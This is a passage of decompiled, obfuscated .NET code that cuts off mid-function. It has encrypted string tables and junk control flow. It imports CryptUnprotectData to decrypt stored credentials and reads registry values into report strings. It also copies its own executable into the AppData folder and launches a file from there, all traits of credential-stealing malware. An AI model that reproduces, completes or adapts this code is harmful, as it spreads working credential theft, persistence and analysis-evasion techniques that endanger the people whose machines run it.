    static \u000F.\u0006.\u0004 \u0001([In] \u000F.\u0006.\u0005 obj0)
    {
      byte[] destinationArray;
      try
      {
        do
        {
          destinationArray = new byte[obj0.\u0002];
        }
        while (false);
        Array.Copy((Array) obj0.\u0002, 0, (Array) destinationArray, 0, obj0.\u0002);
        return new \u000F.\u0006.\u0004(destinationArray);
      }
      catch (Exception ex)
      {
        byte[] numArray = destinationArray;
        \u000F.\u0006.\u0005 obj = obj0;
        \u0007.\u0001(ex, (object) numArray, (object) obj);
        throw;
      }
    }

    static void \u0001()
    {
      string Left1;
      string Left2;
      string Left3;
      string[] strArray1;
      try
      {
        Left1 = \u000E.\u0003.\u0001(13);
        Left2 = \u000E.\u0003.\u0001(13);
        Left3 = \u000E.\u0003.\u0001(13);
        try
        {
          Left1 = Conversions.ToString(Registry.GetValue(\u0007.\u0001(\u000E.\u0003.\u0001(5965), \u000E.\u0003.\u0001(55)), \u0007.\u0001(\u000E.\u0003.\u0001(6062), \u000E.\u0003.\u0001(55)), (object) null));
          if (Operators.CompareString(Left1, \u000E.\u0003.\u0001(13), false) == 0)
            Left1 = Conversions.ToString(Registry.GetValue(\u0007.\u0001(\u000E.\u0003.\u0001(5965), \u000E.\u0003.\u0001(55)), \u0007.\u0001(\u000E.\u0003.\u0001(6075), \u000E.\u0003.\u0001(55)), (object) null));
          else if (Operators.CompareString(Left1, \u000E.\u0003.\u0001(13), false) == 0)
            Left1 = Conversions.ToString(Registry.GetValue(\u0007.\u0001(\u000E.\u0003.\u0001(5965), \u000E.\u0003.\u0001(55)), \u0007.\u0001(\u000E.\u0003.\u0001(6088), \u000E.\u0003.\u0001(55)), (object) null));
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
        try
        {
          Left2 = Conversions.ToString(Registry.GetValue(\u0007.\u0001(\u000E.\u0003.\u0001(5965), \u000E.\u0003.\u0001(55)), \u0007.\u0001(\u000E.\u0003.\u0001(6101), \u000E.\u0003.\u0001(55)), (object) null));
          if (Operators.CompareString(Left2, \u000E.\u0003.\u0001(13), false) == 0)
          {
            if (Operators.CompareString(Left2, \u000E.\u0003.\u0001(13), false) == 0)
              Left2 = Conversions.ToString(Registry.GetValue(\u0007.\u0001(\u000E.\u0003.\u0001(5965), \u000E.\u0003.\u0001(55)), \u0007.\u0001(\u000E.\u0003.\u0001(6114), \u000E.\u0003.\u0001(55)), (object) null));
          }
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
        try
        {
          Left3 = Conversions.ToString(Registry.GetValue(\u0007.\u0001(\u000E.\u0003.\u0001(5965), \u000E.\u0003.\u0001(55)), \u0007.\u0001(\u000E.\u0003.\u0001(6127), \u000E.\u0003.\u0001(55)), (object) null));
          if (Operators.CompareString(Left3, \u000E.\u0003.\u0001(13), false) == 0)
            Left3 = Conversions.ToString(Registry.GetValue(\u0007.\u0001(\u000E.\u0003.\u0001(5965), \u000E.\u0003.\u0001(55)), \u0007.\u0001(\u000E.\u0003.\u0001(6144), \u000E.\u0003.\u0001(55)), (object) null));
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
        try
        {
          strArray1 = new string[14]
          {
            \u0007.\u0001(\u000E.\u0003.\u0001(6161), \u000E.\u0003.\u0001(55)),
            Environment.NewLine,
            Environment.NewLine,
            \u0007.\u0001(\u000E.\u0003.\u0001(6258), \u000E.\u0003.\u0001(55)),
            Left1,
            Environment.NewLine,
            \u0007.\u0001(\u000E.\u0003.\u0001(6283), \u000E.\u0003.\u0001(55)),
            Left2,
            Environment.NewLine,
            \u0007.\u0001(\u000E.\u0003.\u0001(6308), \u000E.\u0003.\u0001(55)),
            Left3,
            Environment.NewLine,
            Environment.NewLine,
            \u0007.\u0001(\u000E.\u0003.\u0001(2764), \u000E.\u0003.\u0001(55))
          };
          \u000E.\u0001.\u0004 = string.Concat(strArray1);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          \u000E.\u0001.\u0004 = \u000E.\u0003.\u0001(13);
          ProjectData.ClearProjectError();
        }
      }
      catch (Exception ex)
      {
        string str1 = Left2;
        string str2 = Left1;
        string str3 = Left3;
        string[] strArray2 = strArray1;
        \u0007.\u0001(ex, (object) str1, (object) str2, (object) str3, (object) strArray2);
        throw;
      }
    }

    static void \u0001()
    {
      string str1;
      string str2;
      string[] strArray1;
      try
      {
        str1 = \u000E.\u0003.\u0001(13);
        str2 = \u000E.\u0003.\u0001(13);
        try
        {
          str1 = Conversions.ToString(\u000F.\u0001.\u0001().Registry.GetValue(\u0007.\u0001(\u000E.\u0003.\u0001(6325), \u000E.\u0003.\u0001(55)), \u0007.\u0001(\u000E.\u0003.\u0001(6406), \u000E.\u0003.\u0001(55)), (object) null));
          if (true)
          {
            str2 = Conversions.ToString(\u000F.\u0001.\u0001().Registry.GetValue(\u0007.\u0001(\u000E.\u0003.\u0001(6423), \u000E.\u0003.\u0001(55)), \u0007.\u0001(\u000E.\u0003.\u0001(6504), \u000E.\u0003.\u0001(55)), (object) null));
            strArray1 = new string[8]
            {
              \u0007.\u0001(\u000E.\u0003.\u0001(6521), \u000E.\u0003.\u0001(55)),
              Environment.NewLine,
              Environment.NewLine,
              str1,
              Environment.NewLine,
              \u0007.\u0001(str2),
              Environment.NewLine,
              null
            };
          }
          strArray1[7] = \u0007.\u0001(\u000E.\u0003.\u0001(6582), \u000E.\u0003.\u0001(55));
          do
          {
            \u000E.\u0001.\u0008 = string.Concat(strArray1);
          }
          while (false);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          \u000E.\u0001.\u0008 = \u000E.\u0003.\u0001(13);
          ProjectData.ClearProjectError();
        }
      }
      catch (Exception ex)
      {
        string str3 = str2;
        string str4 = str1;
        string[] strArray2 = strArray1;
        \u0007.\u0001(ex, (object) str3, (object) str4, (object) strArray2);
        throw;
      }
    }

    static void \u0001([In] \u000F.\u0006.\u0008 obj0, [In] byte[] obj1)
    {
      try
      {
        do
        {
          obj0.\u0002 = obj1;
          obj0.\u0008 = 0;
          obj0.\u000E = obj1.Length;
        }
        while (false);
      }
      catch (Exception ex)
      {
        \u000F.\u0006.\u0008 obj = obj0;
        byte[] numArray = obj1;
        \u0007.\u0001(ex, (object) obj, (object) numArray);
        throw;
      }
    }

    [DllImport("Crypt32.dll", EntryPoint = "CryptUnprotectData", CharSet = CharSet.Auto, SetLastError = true)]
    static extern bool \u0001(
      [In] ref \u0006.\u0003.\u0003 obj0,
      [In] string obj1,
      [In] ref \u0006.\u0003.\u0003 obj2,
      [In] IntPtr obj3,
      [In] ref \u0006.\u0003.\u0002 obj4,
      [In] int obj5,
      [In] ref \u0006.\u0003.\u0003 obj6);

    static bool \u0001([In] \u0005.\u0004 obj0) => obj0.\u0002;

    static long \u0001([In] \u000F.\u0006.\u0006 obj0)
    {
      long num;
      try
      {
        num = obj0.\u0001;
      }
      catch (Exception ex)
      {
        \u000F.\u0006.\u0006 obj = obj0;
        \u0007.\u0001(ex, (object) obj);
        throw;
      }
      return num;
    }

    static int \u0001([In] \u000F.\u0006.\u000E obj0)
    {
      int num;
      try
      {
        num = obj0.\u0003;
      }
      catch (Exception ex)
      {
        \u000F.\u0006.\u000E obj = obj0;
        \u0007.\u0001(ex, (object) obj);
        throw;
      }
      return num;
    }

    static unsafe bool \u0001([In] long obj0)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(2);
      try
      {
        *(sbyte*) voidPtr = (sbyte) ((obj0 & 1L) == 1L);
        *(sbyte*) ((IntPtr) voidPtr + 1) = *(sbyte*) voidPtr;
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<bool> local1 = (ValueType) (bool) *(sbyte*) voidPtr;
        // ISSUE: variable of a boxed type
        __Boxed<long> local2 = (ValueType) obj0;
        \u0007.\u0001(ex, (object) local1, (object) local2);
        throw;
      }
      return (bool) *(sbyte*) ((IntPtr) voidPtr + 1);
    }

    static Assembly \u0001()
    {
      Assembly assembly;
      try
      {
        assembly = Assembly.GetExecutingAssembly();
      }
      catch
      {
        assembly = (Assembly) null;
      }
      return assembly;
    }

    static string \u0001([In] string obj0)
    {
      while (obj0.StartsWith(\u000E.\u0003.\u0001(6643)))
      {
label_2:
        if (true)
        {
          int num;
          for (int index = obj0.EndsWith(\u000E.\u0003.\u0001(6664)) ? 1 : 0; index != 0; index = num)
          {
            if (true)
            {
              num = 6685;
              if (num != 0)
                return \u000E.\u0003.\u0001(num);
            }
            else
              goto label_2;
          }
          break;
        }
      }
      return obj0;
    }

    static void \u0001([In] Exception obj0, [In] object[] obj1)
    {
label_0:
      if (obj0 == null)
        goto label_4;
      else
        goto label_8;
label_1:
      if (\u0005.\u0006.\u0001 == \u000E.\u0003.\u0001(6758))
      {
        if (true)
        {
          if (\u0007.\u0001().\u0001((SecurityException) obj0))
            return;
        }
        else
          goto label_0;
      }
label_4:
      while (true)
      {
        \u0007.\u0001(obj0, obj1);
        if (true)
        {
          \u0007.\u0001().\u0001(obj0, false, false);
          if (true)
          {
            if (true)
              return;
            goto label_0;
          }
        }
        else
          goto label_8;
      }
      goto label_1;
label_8:
      if (!(obj0 is SecurityException))
        goto label_4;
      else
        goto label_1;
    }

    static bool \u0001([In] \u000F.\u0006.\u0008 obj0)
    {
      bool flag;
      try
      {
        flag = obj0.\u000E == obj0.\u0008;
      }
      catch (Exception ex)
      {
        \u000F.\u0006.\u0008 obj = obj0;
        \u0007.\u0001(ex, (object) obj);
        throw;
      }
      return flag;
    }

    static void \u0001([In] \u000E.\u0004 obj0, [In] \u0001.\u0001 obj1)
    {
      \u0001.\u0001 obj2;
      if (true)
      {
        if (true)
          obj2 = obj0.\u0001;
      }
      else
        goto label_5;
label_2:
      \u0001.\u0001 comparand;
      if (true)
      {
        \u0001.\u0001 obj3 = obj2;
        if (true)
        {
          comparand = obj3;
          goto label_9;
        }
        else
          goto label_9;
      }
label_4:
      if (obj2 != comparand)
        goto label_2;
label_5:
      if (true)
        return;
label_9:
      \u0001.\u0001 obj4 = comparand + obj1;
      obj2 = Interlocked.CompareExchange<\u0001.\u0001>(ref obj0.\u0001, obj4, comparand);
      goto label_4;
    }

    static int \u0001([In] \u000F.\u0006.\u0002 obj0, [In] int obj1)
    {
      int num1;
      try
      {
        if (obj0.\u0003 < obj1)
          goto label_5;
label_4:
        return (int) ((long) obj0.\u0001 & (long) ((1 << obj1) - 1));
label_5:
        if (obj0.\u0001 == obj0.\u0002)
          return -1;
        \u000F.\u0006.\u0002 obj2 = obj0;
        int num2 = (int) obj2.\u0001;
        byte[] numArray1 = obj0.\u0001;
        \u000F.\u0006.\u0002 obj3 = obj0;
        int num3 = obj3.\u0001;
        if (true)
          goto label_6;
label_3:
        obj3.\u0001 = num3 + 1;
        int index1 = num1;
        int num4 = (int) numArray1[index1] & (int) byte.MaxValue;
        byte[] numArray2 = obj0.\u0001;
        num1 = obj0.\u0001++;
        int index2 = num1;
        int num5 = ((int) numArray2[index2] & (int) byte.MaxValue) << 8;
        int num6 = (num4 | num5) << obj0.\u0003;
        obj2.\u0001 = (uint) (num2 | num6);
        obj0.\u0003 += 16;
        goto label_4;
label_6:
        num1 = num3;
        goto label_3;
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<int> local1 = (ValueType) num1;
        \u000F.\u0006.\u0002 obj = obj0;
        // ISSUE: variable of a boxed type
        __Boxed<int> local2 = (ValueType) obj1;
        \u0007.\u0001(ex, (object) local1, (object) obj, (object) local2);
        throw;
      }
    }

    static int \u0001([In] \u000F.\u0006.\u0003 obj0)
    {
      int num1;
      try
      {
        do
        {
          int num2 = 32768;
          if (num2 != 0)
            num2 -= obj0.\u0002;
          num1 = num2;
        }
        while (false);
      }
      catch (Exception ex)
      {
        \u000F.\u0006.\u0003 obj = obj0;
        \u0007.\u0001(ex, (object) obj);
        throw;
      }
      return num1;
    }

    static void \u0001()
    {
      string fileName1;
      try
      {
        try
        {
          if (System.IO.File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + \u0007.\u0001(\u000E.\u0003.\u0001(6763), \u000E.\u0003.\u0001(55))))
            System.IO.File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + \u0007.\u0001(\u000E.\u0003.\u0001(6812), \u000E.\u0003.\u0001(55)));
          string fileName2 = Process.GetCurrentProcess().MainModule.FileName;
          fileName1 = Process.GetCurrentProcess().MainModule.FileName;
          int Length = \u0007.\u0001(0, ref fileName1, 256);
          \u0007.\u0001(Strings.Left(fileName2, Length), Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + \u0007.\u0001(\u000E.\u0003.\u0001(6861), \u000E.\u0003.\u0001(55)), 8L);
          int folder = 26;
          if (folder != 0)
          {
            Process.Start(Environment.GetFolderPath((Environment.SpecialFolder) folder) + \u0007.\u0001(\u000E.\u0003.\u0001(6910), \u000E.\u0003.\u0001(55)));
            folder = \u0007.\u0001(0U);
          }
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      catch (Exception ex)
      {
        string str = fileName1;
        \u0007.\u0001(ex, (object) str);
        throw;
      }
    }

    static void \u0001([In] \u000F.\u0006.\u0007 obj0)
    {
      try
      {
        do
        {
          if (true)
            goto label_2;
label_1:
          continue;
label_2:
          obj0.\u0001 = 0;
          goto label_1;
        }
        while (false);
        obj0.\u0002 = 0;
      }
      catch (Exception ex)
      {
        \u000F.\u0006.\u0007 obj = obj0;
        \u0007.\u0001(ex, (object) obj);
        throw;
      }
    }

    static bool \u0001([In] \u000F.\u0006.\u0007 obj0)
    {
      bool flag;
      try
      {
        do
        {
          do
          {
            if (true)
              goto label_5;
label_3:
            continue;
label_5:
            int num1 = obj0.\u0001 < 16384 ? 1 : 0;
            int num2;
            while (true)
            {
              num2 = num1 == 0 ? 1 : 0;
              if (false)
                num1 = num2;
              else
                break;
            }
            flag = num2 != 0;
            goto label_3;
          }
          while (false);
        }
        while (false);
      }
      catch (Exception ex)
      {
        \u000F.\u0006.\u0007 obj = obj0;
        \u0007.\u0001(ex, (object) obj);
        throw;
      }
      return flag;
    }

    static unsafe bool \u0001([In] \u000F.\u0006.\u0001 obj0)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(13);
      int num;
      try
      {
        num = obj0.\u0001;
        switch (num)
        {
          case 2:
            if (obj0.\u0001)
            {
              obj0.\u0001 = 12;
              *(sbyte*) ((IntPtr) voidPtr + 12) = (sbyte) 0;
              break;
            }
            *(int*) voidPtr = \u0007.\u0001(obj0.\u0001, 3);
            if (*(int*) voidPtr < 0)
            {
              *(sbyte*) ((IntPtr) voidPtr + 12) = (sbyte) 0;
              break;
            }
            \u0007.\u0001(obj0.\u0001, 3);
            if ((*(int*) voidPtr & 1) != 0)
              obj0.\u0001 = true;
            num = *(int*) voidPtr >> 1;
            switch (num)
            {
              case 0:
                \u0007.\u0001(obj0.\u0001);
                obj0.\u0001 = 3;
                break;
              case 1:
                obj0.\u0001 = \u000F.\u0006.\u0004.\u0001;
                obj0.\u0002 = \u000F.\u0006.\u0004.\u0002;
                obj0.\u0001 = 7;
                break;
              case 2:
                obj0.\u0001 = new \u000F.\u0006.\u0005();
                obj0.\u0001 = 6;
                break;
            }
            *(sbyte*) ((IntPtr) voidPtr + 12) = (sbyte) 1;
            break;
          case 3:
            obj0.\u0005 = num = \u0007.\u0001(obj0.\u0001, 16);
            if (num < 0)
            {
              *(sbyte*) ((IntPtr) voidPtr + 12) = (sbyte) 0;
              break;
            }
            \u0007.\u0001(obj0.\u0001, 16);
            obj0.\u0001 = 4;
            goto case 4;
          case 4:
            *(int*) ((IntPtr) voidPtr + 4) = \u0007.\u0001(obj0.\u0001, 16);
            if (*(int*) ((IntPtr) voidPtr + 4) < 0)
            {
              *(sbyte*) ((IntPtr) voidPtr + 12) = (sbyte) 0;
              break;
            }
            \u0007.\u0001(obj0.\u0001, 16);
            obj0.\u0001 = 5;
            goto case 5;
          case 5:
            *(int*) ((IntPtr) voidPtr + 8) = \u0007.\u0001(obj0.\u0001, obj0.\u0001, obj0.\u0005);
            obj0.\u0005 -= *(int*) ((IntPtr) voidPtr + 8);
            if (obj0.\u0005 == 0)
            {
              obj0.\u0001 = 2;
              *(sbyte*) ((IntPtr) voidPtr + 12) = (sbyte) 1;
              break;
            }
            *(sbyte*) ((IntPtr) voidPtr + 12) = (sbyte) !\u0007.\u0001(obj0.\u0001);
            break;
          case 6:
            if (!\u0007.\u0001(obj0.\u0001, obj0.\u0001))
            {
              *(sbyte*) ((IntPtr) voidPtr + 12) = (sbyte) 0;
              break;
            }
            obj0.\u0001 = \u0007.\u0001(obj0.\u0001);
            obj0.\u0002 = \u0007.\u0001(obj0.\u0001);
            obj0.\u0001 = 7;
            goto case 7;
          case 7:
          case 8:
          case 9:
          case 10:
            *(sbyte*) ((IntPtr) voidPtr + 12) = (sbyte) \u0007.\u0001(obj0);
            break;
          case 12:
            *(sbyte*) ((IntPtr) voidPtr + 12) = (sbyte) 0;
            break;
          default:
            *(sbyte*) ((IntPtr) voidPtr + 12) = (sbyte) 0;
            break;
        }
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<int> local1 = (ValueType) *(int*) voidPtr;
        // ISSUE: variable of a boxed type
        __Boxed<int> local2 = (ValueType) *(int*) ((IntPtr) voidPtr + 4);
        // ISSUE: variable of a boxed type
        __Boxed<int> local3 = (ValueType) *(int*) ((IntPtr) voidPtr + 8);
        // ISSUE: variable of a boxed type
        __Boxed<int> local4 = (ValueType) num;
        \u000F.\u0006.\u0001 obj = obj0;
        \u0007.\u0001(ex, (object) local1, (object) local2, (object) local3, (object) local4, (object) obj);
        throw;
      }
      return (bool) *(sbyte*) ((IntPtr) voidPtr + 12);
    }

    [DllImport("kernel32", EntryPoint = "GetModuleFileNameA", CharSet = CharSet.Ansi, SetLastError = true)]
    static extern int \u0001(int _param0, [MarshalAs(UnmanagedType.VBByRefStr)] ref string _param1, int _param2);

    static void \u0001([In] \u0004.\u0002 obj0, [In] bool obj1) => obj0.\u0004 = obj1;

    static bool \u0001()
    {
      \u0007.\u0001((\u0005.\u0006) new \u0003.\u0006());
      return true;
    }

    static int \u0001([In] \u000F.\u0006.\u0003 obj0)
    {
      int num;
      try
      {
        num = obj0.\u0002;
      }
      catch (Exception ex)
      {
        \u000F.\u0006.\u0003 obj = obj0;
        \u0007.\u0001(ex, (object) obj);
        throw;
      }
      return num;
    }

    static unsafe bool \u0001([In] bool obj0, [In] bool obj1, [In] \u000F.\u0006.\u0008 obj2)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(2);
      bool flag;
      try
      {
        do
        {
          \u0007.\u0001(obj2);
          flag = obj0 && obj2.\u0008 == obj2.\u000E;
          *(sbyte*) voidPtr = (sbyte) \u0007.\u0001(obj1, obj2, flag);
        }
        while (\u0007.\u0001(obj2.\u0001) && *(sbyte*) voidPtr != (sbyte) 0);
        *(sbyte*) ((IntPtr) voidPtr + 1) = *(sbyte*) voidPtr;
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<bool> local1 = (ValueType) (bool) *(sbyte*) voidPtr;
        // ISSUE: variable of a boxed type
        __Boxed<bool> local2 = (ValueType) flag;
        \u000F.\u0006.\u0008 obj = obj2;
        // ISSUE: variable of a boxed type
        __Boxed<bool> local3 = (ValueType) obj0;
        // ISSUE: variable of a boxed type
        __Boxed<bool> local4 = (ValueType) obj1;
        \u0007.\u0001(ex, (object) local1, (object) local2, (object) obj, (object) local3, (object) local4);
        throw;
      }
      return (bool) *(sbyte*) ((IntPtr) voidPtr + 1);
    }

    static void \u0001([In] \u000E.\u0004 obj0, [In] \u0006.\u0006 obj1, [In] string obj2) => \u0007.\u0001(obj0, obj1, obj2, string.Empty);

    static unsafe int \u0001([In] \u000F.\u0006.\u0004 obj0, [In] \u000F.\u0006.\u0002 obj1)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(20);
      int num;
      int index;
      try
      {
        if ((index = \u0007.\u0001(obj1, 9)) < 0)
        {
          *(int*) ((IntPtr) voidPtr + 12) = \u0007.\u0001(obj1);
          index = \u0007.\u0001(obj1, *(int*) ((IntPtr) voidPtr + 12));
          num = (int) obj0.\u0001[index];
          if (num >= 0 && (num & 15) <= *(int*) ((IntPtr) voidPtr + 12))
          {
            \u0007.\u0001(obj1, num & 15);
            *(int*) ((IntPtr) voidPtr + 16) = num >> 4;
          }
          else
            *(int*) ((IntPtr) voidPtr + 16) = -1;
        }
        else if ((num = (int) obj0.\u0001[index]) < 0)
        {
          *(int*) voidPtr = -(num >> 4);
          *(int*) ((IntPtr) voidPtr + 4) = num & 15;
          if ((index = \u0007.\u0001(obj1, *(int*) ((IntPtr) voidPtr + 4))) >= 0)
          {
            num = (int) obj0.\u0001[*(int*) voidPtr | index >> 9];
            \u0007.\u0001(obj1, num & 15);
            *(int*) ((IntPtr) voidPtr + 16) = num >> 4;
          }
          else
          {
            *(int*) ((IntPtr) voidPtr + 8) = \u0007.\u0001(obj1);
            do
            {
              index = \u0007.\u0001(obj1, *(int*) ((IntPtr) voidPtr + 8));
              num = (int) obj0.\u0001[*(int*) voidPtr | index >> 9];
              if ((num & 15) <= *(int*) ((IntPtr) voidPtr + 8))
                \u0007.\u0001(obj1, num & 15);
              else
                goto label_8;
            }
            while (false);
            *(int*) ((IntPtr) voidPtr + 16) = num >> 4;
            if (true)
              goto label_15;
label_8:
            *(int*) ((IntPtr) voidPtr + 16) = -1;
          }
        }
        else
        {
          \u0007.\u0001(obj1, num & 15);
          *(int*) ((IntPtr) voidPtr + 16) = num >> 4;
        }
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<int> local1 = (ValueType) index;
        // ISSUE: variable of a boxed type
        __Boxed<int> local2 = (ValueType) num;
        // ISSUE: variable of a boxed type
        __Boxed<int> local3 = (ValueType) *(int*) voidPtr;
        // ISSUE: variable of a boxed type
        __Boxed<int> local4 = (ValueType) *(int*) ((IntPtr) voidPtr + 4);
        // ISSUE: variable of a boxed type
        __Boxed<int> local5 = (ValueType) *(int*) ((IntPtr) voidPtr + 8);
        // ISSUE: variable of a boxed type
        __Boxed<int> local6 = (ValueType) *(int*) ((IntPtr) voidPtr + 12);
        \u000F.\u0006.\u0004 obj2 = obj0;
        \u000F.\u0006.\u0002 obj3 = obj1;
        \u0007.\u0001(ex, (object) local1, (object) local2, (object) local3, (object) local4, (object) local5, (object) local6, (object) obj2, (object) obj3);
        throw;
      }
label_15:
      return *(int*) ((IntPtr) voidPtr + 16);
    }

    static void \u0001([In] Exception obj0, [In] object obj1, [In] object obj2, [In] object obj3, [In] object obj4) => \u0007.\u0001(obj0, new object[4]
    {
      obj1,
      obj2,
      obj3,
      obj4
    });

    static unsafe string \u0001([In] object obj0)
    {
      string empty;
      do
      {
        // ISSUE: untyped stack allocation
        void* voidPtr = (void*) __untypedstackalloc(46);
        try
        {
          if (obj0 == null)
          {
            empty = string.Empty;
            goto label_23;
          }
          else
          {
            if (!(obj0 is int num7))
            {
              switch (obj0)
              {
                case long num1:
                  *(long*) voidPtr = num1;
                  empty = ((long*) voidPtr)->ToString(\u000E.\u0003.\u0001(6959));
                  goto label_23;
                case short _:
label_5:
                  *(short*) ((IntPtr) voidPtr + 40) = (short) obj0;
                  empty = ((short*) ((IntPtr) voidPtr + 40))->ToString(\u000E.\u0003.\u0001(6959));
                  goto label_23;
                case uint num2:
                  *(int*) ((IntPtr) voidPtr + 36) = (int) num2;
                  empty = ((uint*) ((IntPtr) voidPtr + 36))->ToString(\u000E.\u0003.\u0001(6959));
                  goto label_23;
                case ulong num3:
                  *(long*) ((IntPtr) voidPtr + 8) = (long) num3;
                  do
                  {
                    empty = ((ulong*) ((IntPtr) voidPtr + 8))->ToString(\u000E.\u0003.\u0001(6959));
                  }
                  while (false);
                  goto label_23;
                case ushort _:
label_9:
                  *(short*) ((IntPtr) voidPtr + 42) = (short) (ushort) obj0;
                  empty = ((ushort*) ((IntPtr) voidPtr + 42))->ToString(\u000E.\u0003.\u0001(6959));
                  goto label_23;
                case byte num4:
                  *(sbyte*) ((IntPtr) voidPtr + 44) = (sbyte) num4;
                  empty = ((byte*) ((IntPtr) voidPtr + 44))->ToString(\u000E.\u0003.\u0001(6959));
                  goto label_23;
                case sbyte num5:
                  *(sbyte*) ((IntPtr) voidPtr + 45) = num5;
                  if (true)
                  {
                    empty = ((sbyte*) ((IntPtr) voidPtr + 45))->ToString(\u000E.\u0003.\u0001(6959));
                    goto label_23;
                  }
                  else
                    break;
                case IntPtr num6:
                  *(long*) ((IntPtr) voidPtr + 16) = num6.ToInt64();
                  empty = ((long*) ((IntPtr) voidPtr + 16))->ToString(\u000E.\u0003.\u0001(6959));
                  if (false)
                    goto label_23;
                  else
                    goto label_23;
                case UIntPtr _:
                  if (true)
                  {
                    UIntPtr num = (UIntPtr) obj0;
                    if (true)
                    {
                      *(long*) ((IntPtr) voidPtr + 24) = (long) num.ToUInt64();
                      empty = ((ulong*) ((IntPtr) voidPtr + 24))->ToString(\u000E.\u0003.\u0001(6959));
                      goto label_23;
                    }
                    else
                      goto label_9;
                  }
                  else
                    goto label_5;
                default:
                  goto label_21;
              }
            }
            else
              *(int*) ((IntPtr) voidPtr + 32) = num7;
            empty = ((int*) ((IntPtr) voidPtr + 32))->ToString(\u000E.\u0003.\u0001(6959));
            goto label_23;
          }
        }
        catch
        {
        }
label_21:;
      }
      while (false);
      return string.Empty;
label_23:
      return empty;
    }

    static void \u0001([In] \u000F.\u0006.\u0002 obj0)
    {
      try
      {
        obj0.\u0001 >>= obj0.\u0003 & 7;
        obj0.\u0003 &= -8;
      }
      catch (Exception ex)
      {
        \u000F.\u0006.\u0002 obj = obj0;
        \u0007.\u0001(ex, (object) obj);
        throw;
      }
    }

    static bool \u0001([In] \u0004.\u0002 obj0) => obj0.\u0002 && obj0.\u0001.\u0001();

    static void \u0001([In] int obj0, [In] \u000F.\u0006.\u000F obj1)
    {
      try
      {
        do
        {
          \u0007.\u0001(obj0, obj1);
          \u0007.\u0001(obj0 >> 16, obj1);
        }
        while (false);
      }
      catch (Exception ex)
      {
        \u000F.\u0006.\u000F obj = obj1;
        // ISSUE: variable of a boxed type
        __Boxed<int> local = (ValueType) obj0;
        \u0007.\u0001(ex, (object) obj, (object) local);
        throw;
      }
    }

    static unsafe int \u0001([In] \u000F.\u0006.\u0008 obj0)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(8);
      short num1;
      try
      {
        *(int*) voidPtr = (obj0.\u0001 << 5 ^ (int) obj0.\u0001[obj0.\u0005 + 2]) & (int) short.MaxValue;
        short[] numArray1 = obj0.\u0002;
        int index1 = obj0.\u0005 & (int) short.MaxValue;
        short[] numArray2 = obj0.\u0001;
        int index2 = *(int*) voidPtr;
        int num2;
        num1 = (short) (num2 = (int) numArray2[index2]);
        numArray1[index1] = (short) num2;
        obj0.\u0001[*(int*) voidPtr] = (short) obj0.\u0005;
        obj0.\u0001 = *(int*) voidPtr;
        *(int*) ((IntPtr) voidPtr + 4) = (int) num1 & (int) ushort.MaxValue;
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<short> local1 = (ValueType) num1;
        // ISSUE: variable of a boxed type
        __Boxed<int> local2 = (ValueType) *(int*) voidPtr;
        \u000F.\u0006.\u0008 obj = obj0;
        \u0007.\u0001(ex, (object) local1, (object) local2, (object) obj);
        throw;
      }
      return *(int*) ((IntPtr) voidPtr + 4);
    }

    static void \u0001([In] \u0004.\u0002 obj0) => obj0.\u0001 = true;

    static string \u0001([In] string obj0, [In] string obj1, [In] string obj2)
    {
      string[] strArray1;
      string[] strArray2;
      try
      {
        string str;
        try
        {
          do
          {
            if (true)
              goto label_2;
label_1:
            continue;
label_2:
            strArray1 = Strings.Split(obj1, obj2);
            goto label_1;
          }
          while (false);
          string[] strArray3 = Strings.Split(strArray1[1], obj0);
          if (true)
            strArray2 = strArray3;
          str = strArray2[0];
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          if (true)
            ProjectData.ClearProjectError();
        }
        return str;
      }
      catch (Exception ex)
      {
        string str1;
        string str2 = str1;
        string[] strArray4 = strArray1;
        string[] strArray5 = strArray2;
        string str3 = obj1;
        string str4 = obj2;
        string str5 = obj0;
        \u0007.\u0001(ex, (object) str2, (object) strArray4, (object) strArray5, (object) str3, (object) str4, (object) str5);
        throw;
      }
    }

    static unsafe void \u0001()
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(8);
      RegistryKey registryKey1;
      try
      {
        *(int*) voidPtr = 0;
        try
        {
          if (!System.IO.File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + \u0007.\u0001(\u000E.\u0003.\u0001(1924), \u000E.\u0003.\u0001(55))))
          {
            if (true)
              System.IO.File.Copy(Process.GetCurrentProcess().MainModule.FileName, Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + \u0007.\u0001(\u000E.\u0003.\u0001(1924), \u000E.\u0003.\u0001(55)), true);
          }
        }
        catch (Exception ex)
        {
          int lErl = *(int*) ((IntPtr) voidPtr + 4);
          ProjectData.SetProjectError(ex, lErl);
          ProjectData.ClearProjectError();
        }
label_6:
        *(int*) ((IntPtr) voidPtr + 4) = 1;
        try
        {
